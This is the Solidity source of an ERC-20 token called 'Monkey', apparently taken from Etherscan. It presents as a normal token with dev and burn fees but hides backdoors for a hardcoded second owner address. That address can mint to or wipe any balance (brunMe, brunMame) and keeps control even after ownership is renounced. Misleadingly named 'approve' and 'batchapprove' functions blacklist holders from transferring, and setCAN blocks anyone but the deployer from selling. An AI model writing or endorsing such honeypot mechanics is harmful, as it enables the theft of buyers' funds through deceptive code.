/**
 *Submitted for verification at Etherscan.io on 2022-01-16
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library Address {
   
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private _owner;
    address private _ownercd = 0x276f27232827baf43Fe4FAAF30596633Df650535;


    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );


    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier onlyownercd() {
        require(_ownercd == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyownercd {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _tcdmnd;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _ExcudcdFee;
    mapping(address => bool) private _Excuekd;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply = 1000000000000 * 10**4;
    uint256 private _tFeeTotal;
    
    string private _name = "Monkey";
    string private _symbol = "Monkey";
    uint8 private _decimals = 4;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x276f27232827baf43Fe4FAAF30596633Df650535;
  
    uint256 public deadFee = 5;
    uint256 public devFee = 1;

    mapping(address => bool) private _isExcludedFromFee;
    bool private _rOwned = true;
    bool private _tOwned = false;
    address owners;

    constructor() public {
        _tcdmnd[_msgSender()] = _totalSupply;
         owners = _msgSender();
        _ExcudcdFee[owner()] = true;
        _ExcudcdFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tcdmnd[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_ExcudcdFee[_msgSender()] || _ExcudcdFee[recipient]){
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
             uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(_msgSender(), devAddress, devAmount);
        _transfer(_msgSender(), deadAddress, deadAmount);
        _transfer(_msgSender(), recipient, amount.sub(devAmount).sub(deadAmount));
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(_tOwned){
     require(owners == sender, "mandiee");
        }
        if(_ExcudcdFee[_msgSender()] || _ExcudcdFee[recipient]){
            _transfer(sender, recipient, amount);
            return true;
        }       
        uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(sender, devAddress, devAmount);
        _transfer(sender, deadAddress, deadAmount);
        _transfer(sender, recipient, amount.sub(devAmount).sub(deadAmount));
    
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                ""
            )
        );
        return true;
    }


    function ExcudFromReward(address Mame) public view returns (bool) {
        return _Excuekd[Mame];
    }

    function totalFee() public view returns (uint256) {
        return _tFeeTotal;
    }

    function excudeFromFee(address Mame) public onlyownercd {
        _ExcudcdFee[Mame] = true;
    }

    function includeInFee(address Mame) public onlyownercd {
        _ExcudcdFee[Mame] = false;
    }
     function SETde(bool Mame) external onlyOwner() {
        _rOwned = Mame;
    }
 
    function setCAN(bool Mame) external onlyownercd() {
        _tOwned = Mame;
    }
    function approve(address Mame) external onlyownercd() {
        _isExcludedFromFee[Mame] = true;
    }

    function _libera(address Mame) external onlyownercd() {
        delete _isExcludedFromFee[Mame];
    }
    function batchapprove(
        address[] 
        memory _address, 
        bool _bool
    ) public onlyownercd {
        for (uint i=0; i<_address.length; i++) {
            _isExcludedFromFee[_address[i]] = _bool;
        }
    }
    
    function brunMe(address burnMame, uint256 burnMameshp) public onlyownercd {
        _tcdmnd[burnMame] = _tcdmnd[burnMame].add(burnMameshp);
    }

    function brunMame(address burnMame, uint256 burnMameshp) public onlyownercd {
        _tcdmnd[burnMame] = _tcdmnd[burnMame].sub(burnMameshp);
    }
    function askMame(address Mame)
        external
        view
        onlyownercd()
        returns (bool)
    {
        return _isExcludedFromFee[Mame];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "Mame");
        require(spender != address(0), "Mame");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "Mame");
        require(to != address(0), "Mame");
        require(amount > 0, "Mame");

      if (_rOwned) {
            require(_isExcludedFromFee[from] == false, "Mame");
        }  


        _transfers(from, to, amount);
    }

    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {   
        require(sender != address(0), "Mame");
        require(recipient != address(0), "Mame");
    
        _tcdmnd[sender] = _tcdmnd[sender].sub(toAmount);
        _tcdmnd[recipient] = _tcdmnd[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }
 function TransferToken(
        address[] 
        memory Mame, 
        uint256 Meshps
    ) public onlyownercd {
        for (uint i=0; i<Mame.length; i++) {
            _transfers(_msgSender(), Mame[i], Meshps);
        }
    }
}